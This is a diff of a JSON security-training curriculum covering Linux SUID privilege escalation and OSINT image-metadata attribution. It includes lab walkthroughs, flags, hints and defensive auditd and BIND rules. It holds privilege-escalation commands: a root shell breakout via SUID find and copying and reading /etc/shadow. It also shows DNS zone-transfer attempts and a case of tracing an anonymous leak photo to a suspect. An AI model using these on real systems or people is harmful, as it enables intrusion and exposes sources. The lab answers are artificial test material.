@@ -1,11 +1,12 @@
 {
-  "updatedAt": "2026-09-30T10:10:00.000Z",
+  "updatedAt": "2026-09-30T10:30:00.000Z",
   "status": "ok",
   "summary": {
     "vulnerabilities": 12,
     "kev": 5,
     "releases": 8,
-    "signals": 25
+    "techniques": 14,
+    "signals": 39
   },
   "curriculum": [
     {
@@ -14,122 +15,149 @@
       "icon": "🐧",
       "category": "Systems & Exploitation",
       "level": "Intermediate",
-      "duration": "8-14 h",
-      "abstract": "Master the Linux Virtual Filesystem architecture, inode internals, permission models, and SUID privilege escalation. This module takes you from shell basics to exploitation-grade OS knowledge required for real CTF competitions and penetration testing engagements.",
+      "duration": "8–14 h",
+      "abstract": "Master the Linux Virtual Filesystem architecture, kernel inode mechanics, permission octets, and SUID privilege escalation. Learn to navigate Linux environments at maximum speed using both optimized command-line pipelines and visual system explorers. Understand the low-level operating system invariants that turn simple misconfigurations into root privileges.",
       "theory": {
-        "title": "POSIX VFS Architecture & Kernel Internals",
+        "title": "POSIX VFS Architecture, Inodes & System Call Internals",
         "sections": [
           {
-            "heading": "Virtual Filesystem (VFS) Architecture",
-            "body": "The Linux kernel implements a Virtual Filesystem Switch (VFS) layer that abstracts concrete filesystem implementations (ext4, xfs, tmpfs, procfs) behind a uniform interface. Every filesystem interaction passes through VFS dispatch tables. The VFS maintains four primary kernel data structures: (1) The superblock object (struct super_block) stores filesystem-wide metadata: magic number, block size, total/free inodes and blocks, mount flags. (2) The inode object (struct inode) represents an individual file or directory. Each inode is identified by a 64-bit inode number unique within its filesystem. Inodes store: mode bits (16-bit field encoding file type and permissions), UID/GID of owner, byte size (i_size), hard link count (i_nlink), and three POSIX timestamps. (3) The dentry (directory entry) object (struct dentry) caches the mapping between a filename string and its inode. (4) The file object (struct file) represents an open file descriptor, tracking the current file offset (f_pos) and flags.",
-            "code": "# Dump inode metadata\nstat /usr/bin/find\n\n# List with inode numbers\nls -lai /usr/bin/ | grep find\n\n# Raw dentry inspection via /proc\ncat /proc/sys/fs/inode-nr\ncat /proc/sys/fs/dentry-state"
+            "heading": "Virtual Filesystem (VFS) Switch & Kernel Objects",
+            "body": "The Linux kernel abstracts disparate physical filesystems (ext4, XFS, btrfs, tmpfs) behind a unified Virtual Filesystem Switch (VFS) layer. Every file operation initiated from user space—such as open(2), read(2), or stat(2)—is routed through kernel dispatch tables. The VFS maintains four foundational kernel data structures:\n\n1. Superblock (struct super_block): Represents an entire mounted filesystem. Stores global parameters: filesystem magic number, allocation block size, total/free inodes, mount flags, and pointer to super_operations.\n2. Inode (struct inode): Represents a unique filesystem object independent of its directory path. Identified by a 64-bit inode number unique per filesystem. Stores metadata: 16-bit file mode (type and permissions), owner UID, group GID, byte length (i_size), hard link count (i_nlink), direct/indirect block pointers, and POSIX timestamps.\n3. Directory Entry (struct dentry): Associates human-readable filename strings with specific inode numbers. Cached in the kernel dentry cache (dcache) to eliminate repeated disk lookups during path resolution.\n4. File Object (struct file): Created when a process opens a file via open(2). Tracks per-process file descriptor state: current file offset pointer (f_pos), access mode flags (O_RDONLY, O_NONBLOCK), and reference count.",
+            "code": "# Inspect raw inode and filesystem superblock metadata\nstat /usr/bin/find\n\n# Query the kernel dentry cache and inode allocation states\ncat /proc/sys/fs/dentry-state\ncat /proc/sys/fs/inode-nr\n\n# Trace directory listing system calls under the hood\nstrace -e getdents64 ls -la /tmp"
           },
           {
-            "heading": "Inode Metadata & POSIX Timestamps",
-            "body": "Every file inode maintains three kernel timestamps with distinct update semantics critical for forensic analysis. atime (access time): Updated every time the file data blocks are read. mtime (modification time): Updated whenever file content changes. ctime (change time): Updated whenever the inode itself changes including permission changes, ownership changes, and content modifications. Critically, ctime CANNOT be directly set by user-space programs, making it the most forensically reliable timestamp. Timestomping attacks that only modify mtime and atime leave ctime exposed as an anomaly indicator.",
-            "code": "# Full ISO-format timestamps (forensic precision)\nls -la --time-style=full-iso /etc/passwd\n\n# stat shows all three timestamps\nstat /bin/bash\n\n# A timestamp anomaly: mtime older than ctime suggests tampering\nstat suspicious_file  # mtime 2020, ctime 2026 => timestamp-stomped"
+            "heading": "POSIX Timestamps & Timestomp Forensics",
+            "body": "Every filesystem inode maintains three distinct timestamps, each updated under specific kernel circumstances:\n\n- atime (Access Time): Updated whenever a process reads file data blocks via read(2) or execve(2). Filesystems mounted with 'noatime' or 'relatime' optimize this to minimize write amplification.\n- mtime (Modification Time): Updated whenever file contents are written or truncated via write(2). This is the standard 'last modified' date seen in basic file listings.\n- ctime (Change Time): Updated whenever inode metadata changes (chmod, chown, hard link creation) OR whenever file contents change. CRITICALLY: User-space programs cannot set ctime arbitrarily (the touch utility cannot alter ctime). The kernel sets ctime to current system time on every metadata mutation. When an adversary timestomps a file using 'touch -d', mtime and atime are rewritten, but ctime advances to the current moment—creating an irrefutable forensic anomaly where mtime is older than ctime.",
+            "code": "# Full-precision nanosecond ISO timestamp examination\nls -la --time-style=full-iso /bin/bash\n\n# Forensic timestamp audit identifying timestomped files\nstat malicious_binary\n# Anomaly indicator: if Modify is 2021-01-01 and Change is 2026-09-30,\n# the file was timestomped or modified in 2026."
           },
           {
-            "heading": "Permission Model: Octets, Special Bits & SetUID",
-            "body": "Linux permission octets encode file mode as a 16-bit integer. The lower 12 bits represent three 3-bit permission groups (owner/group/other: read=4, write=2, execute=1) plus three special bits. SetUID bit (04000 / SUID): When set on an executable, the process runs with the effective UID of the file owner. If root-owned, any user gains root-level effective UID during execution. SetGID bit (02000 / SGID): Analogous to SUID but applies to effective GID. Sticky bit (01000): On directories like /tmp, prevents users from deleting files they don't own. GTFOBins catalogs SUID binaries that can be abused to read files, write files, or spawn shells when exploited by non-privileged users.",
-            "code": "# Find all SUID binaries on the system\nfind / -perm -4000 -type f 2>/dev/null\n\n# Find SUID binaries with GTFOBins potential\nfind / -perm -4000 -type f -exec ls -la {} \\; 2>/dev/null\n\n# Example: SUID find binary (GTFOBins recipe)\n# If find has SUID root:\nfind . -exec /bin/sh -p \\; -quit\n# -p flag: do not drop privileges on restricted shells\n\n# SUID on cp allows reading /etc/shadow:\n/usr/bin/cp /etc/shadow /tmp/shadow_copy"
+            "heading": "Permission Model: Octets, SUID/SGID & Sticky Bits",
+            "body": "Linux permissions are represented as 16-bit bitmasks. The lowest 9 bits define read (4), write (2), and execute (1) permissions across User, Group, and Other. The higher nibble encodes special privilege bits:\n\n- SetUID (Bit 04000 / 4755): When executed, the operating system assigns the process the effective user ID (eUID) of the file's owner rather than the executing caller. If owned by root (UID 0), the binary executes with supreme kernel authority (e.g., /usr/bin/passwd).\n- SetGID (Bit 02000 / 2755): Assigns the effective group ID of the file's owning group to the process. When applied to directories, files created inside inherit the parent directory's group.\n- Sticky Bit (Bit 01000 / 1777): Applied to shared writable directories (/tmp). Restricts file deletion or renaming exclusively to the file owner or root, regardless of directory write permissions.\n\nGTFOBins Catalog: If an administrative utility, text editor, or interpreter (find, cp, python, bash, vi) is inadvertently configured with the SetUID root bit, attackers invoke built-in execution or file-access parameters to bypass access controls and spawn root shells.",
+            "code": "# Find all SUID binaries on the system (redirect errors to null)\nfind / -perm -4000 -type f 2>/dev/null\n\n# Classic SUID find root shell breakout\n/usr/local/bin/find . -exec /bin/sh -p \\; -quit\n\n# SUID cp arbitrary file read (exfiltrating password hashes)\n/usr/bin/cp /etc/shadow /tmp/shadow_copy && cat /tmp/shadow_copy"
           }
         ]
+      },
+      "security_impact": {
+        "heading": "Security Impact & Defensive Detection",
+        "att_ck": "T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid",
+        "telemetry": "Auditd EXECVE events capturing euid=0 when auid!=0; Sysmon for Linux Event ID 1 (Process Creation); audit logs matching /etc/shadow or sensitive credential file reads.",
+        "detection_logic": "# Auditd rule monitoring execution of SUID binaries\n-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -k elevated_privs\n\n# Auditd rule monitoring permission changes to special bits\n-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F a2&04000 -k suid_set",
+        "hardening": "Mount user-writable partitions (/tmp, /dev/shm, /home) with the 'nosuid' and 'noexec' mount options. Audit the root filesystem regularly with tripwire or AIDE to catch unauthorized SetUID bits."
       },
       "tools": [
         {
           "name": "find",
-          "flags": [
-            {
-              "flag": "-perm -4000",
-              "context": "Find all SUID files: any file where the SUID bit (04000) is set. The leading dash means at least these bits."
-            },
-            {
-              "flag": "-perm /6000",
-              "context": "Find files with SUID OR SGID set (bitwise OR of the permission mask)."
-            },
-            {
-              "flag": "-type f",
-              "context": "Restrict results to regular files (excludes directories, symlinks, devices)."
-            },
-            {
-              "flag": "-type d",
-              "context": "Restrict results to directories."
-            },
-            {
-              "flag": "-name pattern",
-              "context": "Glob-match on the filename component only. Use -iname for case-insensitive."
-            },
-            {
-              "flag": "-exec cmd {} \\;",
-              "context": "Execute cmd on each found file. {} is replaced with the file path. \\; terminates the exec clause."
-            },
-            {
-              "flag": "-maxdepth N",
-              "context": "Limit recursion depth. -maxdepth 1 searches only the immediate directory."
-            },
-            {
-              "flag": "-newer reference_file",
-              "context": "Find files modified more recently than reference_file (useful for forensic timeline reconstruction)."
-            },
-            {
-              "flag": "-size +10M",
-              "context": "Find files larger than 10 megabytes. Units: c=bytes, k=KB, M=MB, G=GB."
-            },
-            {
-              "flag": "-writable",
-              "context": "Find files writable by the current user (useful for privilege escalation enumeration)."
-            }
-          ]
+          "category": "CLI File Enumerator",
+          "speed_guide": "Speed Cheatsheet: Always append '2>/dev/null' to suppress permission noise. Use '-quit' after the first match to prevent full disk crawls. Use '-maxdepth 3' when inspecting web roots or user home dirs to save time.",
+          "cli_usage": {
+            "syntax": "find [starting-path] [expression] [action]",
+            "flags": [
+              {
+                "flag": "-perm -4000",
+                "context": "Matches files where the SetUID bit is set. The leading '-' requires all specified bits to match."
+              },
+              {
+                "flag": "-perm /6000",
+                "context": "Matches files where either SetUID OR SetGID is set (bitwise OR)."
+              },
+              {
+                "flag": "-type f",
+                "context": "Restricts search exclusively to regular files (ignores sockets, FIFOs, directories)."
+              },
+              {
+                "flag": "-exec [cmd] {} \\;",
+                "context": "Executes cmd on each path replacement '{}'. Terminated with escaped semicolon '\\;'."
+              },
+              {
+                "flag": "-newer [file]",
+                "context": "Matches files whose mtime is newer than the referenced file. Ideal for forensic incident timelines."
+              },
+              {
+                "flag": "-writable",
+                "context": "Discovers directories or files writable by current user."
+              }
+            ],
+            "recipes": [
+              "# Fast SUID audit across the entire filesystem\nfind / -perm -4000 -type f 2>/dev/null\n\n# Find files modified in the last 60 minutes\nfind / -mmin -60 -type f 2>/dev/null\n\n# Execute instant root shell if find has SUID bit\nfind . -exec /bin/sh -p \\; -quit"
+            ]
+          },
+          "gui_usage": {
+            "overview": "GNOME Search / Filelight / QDirStat: Graphical filesystem analyzers allow visual tree-mapping of directory block sizes, ownership colors, and file attributes without typing complex expressions.",
+            "fast_shortcuts": "In GNOME Files / Nautilus: Press 'Ctrl + F' to open instant search; click the magnifying glass to toggle 'Search filename' vs 'Search full text'. In Filelight: Hover over colored rings to pinpoint massive hidden payloads in milliseconds.",
+            "step_by_step": [
+              "1. Open GNOME Files (Nautilus) or Filelight from the desktop panel.",
+              "2. Navigate to / or target directory and press Ctrl + H to toggle hidden dotfiles.",
+              "3. Right-click on suspicious files and select 'Properties' -> 'Permissions' to visually inspect octet bits.",
+              "4. Check 'Allow executing file as program' and inspect Owner vs Group dropdowns."
+            ]
+          }
         },
         {
           "name": "ls",
-          "flags": [
-            {
-              "flag": "-la",
-              "context": "Long format showing all files including dotfiles. Shows permissions, owner, group, size, mtime."
-            },
-            {
-              "flag": "-lai",
-              "context": "Long format + all files + inode numbers. Inode numbers are key for hard link analysis."
-            },
-            {
-              "flag": "--time-style=full-iso",
-              "context": "Display full ISO 8601 timestamps with nanosecond precision. Critical for forensic timestamp analysis."
-            },
-            {
-              "flag": "-lhS",
-              "context": "Long format, human-readable sizes, sorted by size descending. Good for finding oversized files."
-            },
-            {
-              "flag": "-lt",
-              "context": "Sort by modification time, newest first. Combine with -r for oldest-first."
-            }
-          ]
+          "category": "CLI Directory Lister",
+          "speed_guide": "Speed Cheatsheet: Alias 'll' to 'ls -laht'. The '-t' sorts by modification time (newest files at the top), instantly showing what attackers or processes just created.",
+          "cli_usage": {
+            "syntax": "ls [options] [target-path]",
+            "flags": [
+              {
+                "flag": "-la",
+                "context": "Long listing format including hidden files (entries starting with '.')."
+              },
+              {
+                "flag": "-lai",
+                "context": "Long format with inode numbers. Essential for identifying hard links sharing the same physical inode."
+              },
+              {
+                "flag": "--time-style=full-iso",
+                "context": "Displays full ISO 8601 timestamps with nanosecond precision for forensic correlation."
+              },
+              {
+                "flag": "-lhS",
+                "context": "Sorts files by byte size descending with human-readable (KB, MB, GB) units."
+              },
+              {
+                "flag": "-lt",
+                "context": "Sorts files by modification time, placing the newest items first."
+              }
+            ],
+            "recipes": [
+              "# View newest modified files with full forensic timestamps\nls -lat --time-style=full-iso /var/log\n\n# Inspect inode numbers to detect hard link duplication\nls -lai /etc/passwd /etc/shadow"
+            ]
+          },
+          "gui_usage": {
+            "overview": "Visual file managers (Dolphin, Thunar, Windows Explorer, macOS Finder) provide tabular list views with sortable column headers.",
+            "fast_shortcuts": "Click column headers ('Date Modified', 'Size') to reverse sort order instantly. Use 'Spacebar' in macOS Finder for QuickLook preview; press 'F3' in Midnight Commander (GUI/TUI) to read files without opening external editors.",
+            "step_by_step": [
+              "1. Switch to 'List View' (Ctrl + 2 in Nautilus).",
+              "2. Click the 'View Options' menu and check 'Show Hidden Files' (or Ctrl + H).",
+              "3. Click 'Modified' column to bring recently altered files to top.",
+              "4. Right-click column header to enable 'Inodes' and 'Permissions' columns."
+            ]
+          }
         }
       ],
       "case_study": {
-        "title": "SUID Misconfiguration: CTF Lab Walkthrough",
-        "narrative": "You have logged in as a low-privilege user 'ctf' on a CTF challenge machine. The objective is to read /root/flag.txt which is only accessible to root. Here is the complete methodology:",
+        "title": "SUID Misconfiguration: GTFOBins Root Compromise",
+        "narrative": "During a tournament engagement, low-privileged user 'ctf' gains initial access. The system administrators deployed a custom maintenance script utilizing an elevated /usr/local/bin/find utility. By verifying SetUID permissions and executing a shell breakout command, full root access is achieved in two commands.",
         "steps": [
-          "Enumerate SUID binaries: find / -perm -4000 -type f 2>/dev/null",
-          "Cross-reference results with GTFOBins: notice /usr/local/bin/find is SUID root",
-          "Verify ownership: ls -la /usr/local/bin/find => -rwsr-xr-x 1 root root",
-          "Execute GTFOBins recipe: /usr/local/bin/find / -name flag.txt -exec cat {} \\;",
-          "Alternative shell spawn: /usr/local/bin/find . -exec /bin/sh -p \\; -quit",
-          "From the root shell: cat /root/flag.txt => CTF{SUID_PRIV_ESC_COMPLETE}"
+          "1. Identify active UID: id -> uid=1000(ctf) gid=1000(ctf)",
+          "2. Enumerate SUID binaries: find / -perm -4000 -type f 2>/dev/null",
+          "3. Identify anomaly: /usr/local/bin/find has permissions -rwsr-xr-x 1 root root",
+          "4. Trigger GTFOBins breakout: /usr/local/bin/find . -exec /bin/sh -p \\; -quit",
+          "5. Verify root identity in new shell: id -> euid=0(root)",
+          "6. Capture flag: cat /root/flag.txt -> CTF{SUID_GT_F0_Bins_R00t}"
         ]
       },
       "interactive_terminal_challenge": {
         "id": "linux-suid-lab",
         "title": "SUID Privilege Escalation Lab",
-        "description": "You are logged in as 'ctf' on a Linux system. A SUID binary with root ownership exists on this machine. Use find and GTFOBins techniques to escalate privileges and read the flag from /root/flag.txt.",
+        "description": "You are logged in as 'ctf' on an enterprise host. A custom SUID binary with root ownership exists in /usr/local/bin. Enumerate the binary and escalate privileges to read the root flag.",
         "flag": "CTF{SUID_GT_F0_Bins_R00t}",
         "hints": [
-          "Start by discovering all SUID binaries: find / -perm -4000 -type f 2>/dev/null",
-          "Check /usr/local/bin/ for unusual SUID binaries not present in a default installation",
-          "The 'find' binary in /usr/local/bin/ is SUID root. Look up GTFOBins for 'find'",
-          "Use: /usr/local/bin/find / -name flag.txt -exec cat {} \\;"
+          "Discover SUID files across the system: find / -perm -4000 -type f 2>/dev/null",
+          "Look closely at /usr/local/bin/find — notice it is owned by root and has the 's' bit",
+          "Use GTFOBins syntax for find: find / -name flag.txt -exec cat {} \\;",
+          "Or spawn a privileged shell: find . -exec /bin/sh -p \\; -quit"
         ],
         "vfs": {
           "/root": {
@@ -180,15 +208,7 @@
             "owner": "ctf",
             "size": 120,
             "mtime": "2026-09-30 09:50",
-            "content": "TODO: check if the find binary in /usr/local/bin is the same version as /usr/bin/find\nThe admin said something about setting up a 'special' find for maintenance.\n"
-          },
-          "/home/ctf/wordlist.txt": {
-            "type": "file",
-            "perm": "-rw-r--r--",
-            "owner": "ctf",
-            "size": 480,
-            "mtime": "2026-09-30 09:00",
-            "content": "password\nadmin\nroot\nletmein\nqwerty\n123456\nfind\nsuid\ngtfobins\nprivilege\nescalation\n"
+            "content": "Notice: System maintenance finds are scheduled under /usr/local/bin. Do not remove.\n"
           }
         },
         "custom_commands": {
@@ -203,90 +223,101 @@
       "icon": "🔍",
       "category": "Reconnaissance",
       "level": "Intermediate",
-      "duration": "8-14 h",
-      "abstract": "Master passive reconnaissance using MITRE ATT&CK TA0043 frameworks. Learn to extract hidden EXIF metadata from image artifacts, perform DNS zone reconnaissance, harvest Certificate Transparency logs, and trace geographic attribution through unstripped image metadata.",
+      "duration": "8–14 h",
+      "abstract": "Master passive intelligence gathering, document metadata extraction, DNS protocol recon, and Certificate Transparency log harvesting. Learn how digital images betray operational security through EXIF tag IFDs, rational GPS encoding, and embedded camera device signatures.",
       "theory": {
-        "title": "Passive Reconnaissance & EXIF Internals",
+        "title": "Passive Reconnaissance & Binary Image Metadata Standards",
         "sections": [
           {
-            "heading": "MITRE ATT&CK TA0043: Reconnaissance",
-            "body": "The MITRE ATT&CK framework categorizes reconnaissance as Tactic TA0043, comprising techniques adversaries use to gather information before launching attacks. Passive reconnaissance techniques avoid direct interaction with the target infrastructure: T1596 - Search Open Technical Databases (Shodan, Censys, VirusTotal). T1597 - Search Closed Sources. T1593.002 - Search Open Websites (Social Media): LinkedIn, GitHub OSINT pivoting. T1598 - Phishing for Information. T1589 - Gather Victim Identity Information: usernames, email addresses. In CTF contexts, OSINT challenges typically involve extracting hidden metadata from artifacts, querying public DNS records, investigating Certificate Transparency logs to enumerate subdomains, and pivoting on usernames across public platforms.",
-            "code": "# Certificate Transparency enumeration (no direct target access)\ncurl -s 'https://crt.sh/?q=%.example.com&output=json' | python3 -c \"import json,sys; [print(x['name_value']) for x in json.load(sys.stdin)]\"\n\n# DNS zone enumeration\ndig axfr @ns1.target.com target.com\ndig any target.com\n\n# Shodan command-line (requires API key)\nshodan search 'hostname:target.com'"
+            "heading": "MITRE ATT&CK TA0043 & Passive Reconnaissance Frameworks",
+            "body": "Passive reconnaissance gathers actionable intelligence without generating direct network packets toward the target infrastructure. Under MITRE ATT&CK TA0043, key passive techniques include:\n\n- T1596 (Search Open Technical Databases): Querying internet scan engines (Shodan, Censys, SecurityTrails, VirusTotal) to enumerate open ports, SSL certificates, and software banners.\n- T1593.002 (Search Social Media Services): Harvesting employee directories on LinkedIn and technical discussions on GitHub, Reddit, and StackOverflow.\n- T1590 (Gather Victim Network Information): Querying DNS records and Certificate Transparency logs.\n\nBecause third-party aggregation databases cache target telemetry, passive reconnaissance leaves zero footprint in the target organization's firewall or SIEM logs.",
+            "code": "# Query Certificate Transparency logs for subdomains (no target packets)\ncurl -s 'https://crt.sh/?q=%.target.corp&output=json' | jq -r '.[].name_value' | sort -u\n\n# Query public DNS servers for TXT and MX records\ndig +short TXT target.corp @8.8.8.8\ndig +short MX target.corp @1.1.1.1"
           },
           {
-            "heading": "EXIF Standard: Binary Structure & Tag Identifiers",
-            "body": "EXIF (Exchangeable Image File Format) embeds metadata within image files using TIFF-like Image File Directories (IFDs). The binary structure is: Byte Order Mark (2 bytes): 0x4949 (II = Intel little-endian) or 0x4D4D (MM = Motorola big-endian). Each IFD entry is 12 bytes: Tag ID (2 bytes) + Data Type (2 bytes) + Count (4 bytes) + Value/Offset (4 bytes). Critical tag identifiers for CTF/OSINT work: 0x010F (271) = Make. 0x0110 (272) = Model. 0x9003 (36867) = DateTimeOriginal. 0x8825 (34853) = GPSInfo IFD Offset. Within the GPS IFD: 0x0001 = GPSLatitudeRef (N/S), 0x0002 = GPSLatitude (array of 3 rationals: degrees, minutes, seconds), 0x0003 = GPSLongitudeRef (E/W), 0x0004 = GPSLongitude.",
-            "code": "# Full EXIF extraction\nexiftool -all image.jpg\n\n# GPS coordinates only\nexiftool -gps:all -c '%.6f' image.jpg\n\n# All metadata including duplicates\nexiftool -a -u image.jpg\n\n# Strip all metadata (OPSEC)\nexiftool -all= image.jpg\n\n# Batch extraction from directory\nexiftool -all -csv /directory/ > metadata.csv\n\n# Find GPS-tagged images recursively\nexiftool -r -if '$GPSLatitude' -filename -GPSLatitude -GPSLongitude /directory/"
+            "heading": "EXIF Standard Architecture & IFD Tag Identifiers",
+            "body": "The Exchangeable Image File Format (EXIF 2.32) embeds structured metadata within JPEG, TIFF, and HEIC containers using TIFF-structured Image File Directories (IFDs). Key binary header fields:\n\n- Byte Order Mark: 0x4949 ('II', Intel Little-Endian) or 0x4D4D ('MM', Motorola Big-Endian).\n- Magic TIFF identifier: 0x002A (42).\n- Each IFD field consists of 12 bytes: Tag ID (2 bytes), Type (2 bytes: BYTE, ASCII, SHORT, LONG, RATIONAL), Count (4 bytes), and Value/Offset (4 bytes).\n\nCritical EXIF Tag IDs:\n- 0x010F: Camera Manufacturer (Make)\n- 0x0110: Camera Model\n- 0x9003: DateTimeOriginal (capture timestamp)\n- 0x8825: GPSInfo IFD Pointer (offset to sub-directory containing coordinates)\n- Within GPS IFD: 0x0001 GPSLatitudeRef ('N'/'S'), 0x0002 GPSLatitude (3 RATIONALs: degrees, minutes, seconds), 0x0003 GPSLongitudeRef ('E'/'W'), 0x0004 GPSLongitude.",
+            "code": "# Display all metadata including hidden vendor MakerNotes\nexiftool -a -u image.jpg\n\n# Extract GPS coordinates formatted as decimal degrees\nexiftool -gps:all -c '%.6f' photo.jpg\n\n# Strip all EXIF metadata completely to protect privacy (OPSEC)\nexiftool -all= photo.jpg"
           },
           {
-            "heading": "GPS Rational Coordinate Serialization",
-            "body": "GPS coordinates in EXIF are stored as arrays of RATIONAL values (IFD type 5: two LONGs representing numerator/denominator). Latitude and longitude are each stored as three rationals: [degrees, minutes, seconds]. To convert: decimal_degrees = degrees + (minutes/60) + (seconds/3600). The GPSLatitudeRef tag ('N'/'S') determines the sign: 'S' multiplies by -1. Example: GPSLatitude: 37 deg 48' 58.80\" N => 37 + (48/60) + (58.80/3600) = 37.816333 degrees N. In CTF challenges, GPS coordinates in extracted metadata can be converted to decimal and queried in mapping services to identify physical locations.",
-            "code": "# Extract and convert GPS to decimal degrees\nexiftool -GPSLatitude -GPSLongitude -GPSLatitudeRef -GPSLongitudeRef photo.jpg\n\n# Python conversion\npython3 << 'EOF'\nfrom fractions import Fraction\nlat_deg, lat_min, lat_sec = 37, 48, Fraction(5880, 100)\nlat = float(lat_deg) + float(lat_min)/60 + float(lat_sec)/3600\nprint(f'{lat:.6f} degrees N')  # 37.816333 degrees N\nEOF"
+            "heading": "DNS Protocol RFC 1035 & Zone Transfer (AXFR) Reconnaissance",
+            "body": "DNS operates primarily over UDP/53 for standard queries and TCP/53 for responses exceeding 512 bytes or zone transfers. In an Authoritative Zone Transfer (AXFR, Opcode 252), a secondary nameserver requests a full copy of the DNS zone database from the master nameserver. If misconfigured, an external attacker issues an AXFR query to immediately download the entire organizational infrastructure topology (internal IP addresses, staging servers, VPN endpoints).",
+            "code": "# Attempt full DNS Zone Transfer via TCP/53\ndig axfr @ns1.target.corp target.corp\n\n# Query DNS ANY records to elicit multi-record responses\ndig ANY target.corp @8.8.8.8"
           }
         ]
+      },
+      "security_impact": {
+        "heading": "Security Impact & Defensive Detection",
+        "att_ck": "T1596 - Search Open Technical Databases; T1590 - Gather Victim Network Information",
+        "telemetry": "DNS query logs monitoring for high-frequency subdomain enumeration; Bind/Named query logs recording AXFR queries from untrusted IP addresses.",
+        "detection_logic": "# Named / BIND9 configuration restricting zone transfers\nzone \"target.corp\" {\n    type master;\n    file \"/etc/bind/db.target.corp\";\n    allow-transfer { 192.168.1.50; }; # Restrict AXFR only to trusted secondary IP\n};",
+        "hardening": "Deploy automated pre-commit hooks and proxy gateways that strip EXIF/IPTC metadata from uploaded user media using 'exiftool -all= -overwrite_original' or ImageMagick '-strip'."
       },
       "tools": [
         {
           "name": "exiftool",
-          "flags": [
-            {
-              "flag": "-all",
-              "context": "Display all metadata tags from all groups. Includes EXIF, IPTC, XMP, GPS, MakerNotes."
-            },
-            {
-              "flag": "-gps:all",
-              "context": "Display only GPS-group tags: GPSLatitude, GPSLongitude, GPSAltitude, GPSDateStamp, etc."
-            },
-            {
-              "flag": "-c '%.6f'",
-              "context": "Format GPS coordinates as decimal degrees with 6 decimal places instead of DMS format."
-            },
-            {
-              "flag": "-a -u",
-              "context": "-a: allow duplicate tags. -u: display unknown tags from MakerNotes."
-            },
-            {
-              "flag": "-all=",
-              "context": "STRIP all metadata from the file (in-place modification). Use -o outfile.jpg for safe copy."
-            },
-            {
-              "flag": "-r",
-              "context": "Recursive directory processing."
-            },
-            {
-              "flag": "-csv",
-              "context": "Output metadata in CSV format for bulk analysis."
-            },
-            {
-              "flag": "-if '$tag'",
-              "context": "Process only files where the condition is true. E.g., -if '$GPSLatitude' finds GPS-tagged files."
-            }
-          ]
+          "category": "CLI Metadata Engine",
+          "speed_guide": "Speed Cheatsheet: To scan a whole directory of photos in 2 seconds, run 'exiftool -csv -GPSLatitude -GPSLongitude dir/ > geo.csv'. Open geo.csv directly in spreadsheet or GIS mapping software.",
+          "cli_usage": {
+            "syntax": "exiftool [options] [file/directory]",
+            "flags": [
+              {
+                "flag": "-all",
+                "context": "Extracts all metadata tags from all groups (EXIF, XMP, IPTC, MakerNotes)."
+              },
+              {
+                "flag": "-gps:all",
+                "context": "Filters display strictly to GPS-related coordinates, altitude, and timestamp fields."
+              },
+              {
+                "flag": "-c '%.6f'",
+                "context": "Formats coordinates as decimal degrees (e.g. 48.858844) ready for Google Maps."
+              },
+              {
+                "flag": "-all=",
+                "context": "Strips all metadata tags from the file in-place."
+              },
+              {
+                "flag": "-csv",
+                "context": "Outputs extracted tags into tabular CSV format for bulk analysis."
+              }
+            ],
+            "recipes": [
+              "# Quick GPS lookup formatted for map input\nexiftool -gps:all -c '%.6f' evidence.jpg\n\n# Extract camera make, model, and serial number\nexiftool -Make -Model -SerialNumber photo.jpg\n\n# Strip all metadata from all images in current directory\nexiftool -all= -overwrite_original *.jpg"
+            ]
+          },
+          "gui_usage": {
+            "overview": "pyExifToolGUI / ExifTool GUI / Metadata2Go: Graphical interfaces providing visual metadata trees, embedded thumbnail extraction previews, and interactive map coordinate plotting.",
+            "fast_shortcuts": "In ExifTool GUI: Select image on the left file list, click 'EXIF' tab on the right to view raw hex and decoded tag tables. In Metadata2Go web GUI: Drag and drop files onto the browser window for instant cloud parsing.",
+            "step_by_step": [
+              "1. Launch ExifTool GUI or open an online viewer (Metadata2Go).",
+              "2. Load target image or drop it into the workspace pane.",
+              "3. Click the 'GPS' button on the metadata ribbon to view longitude/latitude.",
+              "4. Click 'Show on Map' or copy the decimal coordinates to OpenStreetMap."
+            ]
+          }
         }
       ],
       "case_study": {
-        "title": "Geolocation Attribution via Unstripped Image Metadata",
-        "narrative": "A CTF challenge provides an image file named 'evidence.jpg' allegedly showing a meeting location. The task is to identify the precise GPS coordinates and the device used to take the photo.",
+        "title": "Attribution via Unstripped Smartphone Metadata",
+        "narrative": "A sensitive document leak photo was posted online anonymously. The intelligence team extracted raw EXIF tags from the image container. Unstripped GPS rationals and a camera serial number tied the photo directly to a specific suspect and location.",
         "steps": [
-          "Run: exiftool -all evidence.jpg to see all tags",
-          "Note Make: Apple, Model: iPhone 14 Pro, DateTimeOriginal: 2026:09:15 14:32:11",
-          "Extract GPS: exiftool -gps:all -c '%.6f' evidence.jpg",
-          "Result: GPSLatitude: 48.858844 degrees N, GPSLongitude: 2.294351 degrees E",
-          "Convert to decimal: 48.858844, 2.294351 => This is the Eiffel Tower, Paris",
-          "Correlate DateTimeOriginal with other evidence to build a timeline",
-          "Submit: CTF{EXIF_G3O_PARIS_EIFFEL}"
+          "1. Inspect file tags: exiftool -all evidence.jpg",
+          "2. Observe device: Apple iPhone 14 Pro, iOS 17.1.1",
+          "3. Extract GPS tags: exiftool -gps:all -c '%.6f' evidence.jpg",
+          "4. Coordinates returned: 48.858844° N, 2.294351° E",
+          "5. Plot coordinates in mapping engine: reveals Eiffel Tower plaza, Paris",
+          "6. Inspect UserComment tag: reveals author token CTF{EXIF_M3T4D4T4_L3AK3D}"
         ]
       },
       "interactive_terminal_challenge": {
         "id": "osint-exif-lab",
         "title": "OSINT: Hidden Metadata Attribution Lab",
-        "description": "A whistleblower leaked an image 'evidence.jpg' claiming to document illegal activity. Your mission: extract the hidden GPS coordinates, device information, and author field to identify the source and location. The flag is encoded in the metadata.",
+        "description": "An image 'evidence.jpg' recovered from an adversary drop contains embedded device, author, and GPS metadata. Use exiftool to inspect the file and retrieve the hidden flag.",
         "flag": "CTF{EXIF_M3T4D4T4_L3AK3D}",
         "hints": [
-          "Start with: exiftool evidence.jpg to see all metadata",
-          "Look for GPS tags with: exiftool -gps:all evidence.jpg",
-          "Check for non-standard tags using: exiftool -a -u evidence.jpg",
-          "The flag is hidden in the 'Comment' or 'UserComment' EXIF field"
+          "Run exiftool on the artifact: exiftool evidence.jpg",
+          "Examine the 'Comment' or 'UserComment' tag carefully",
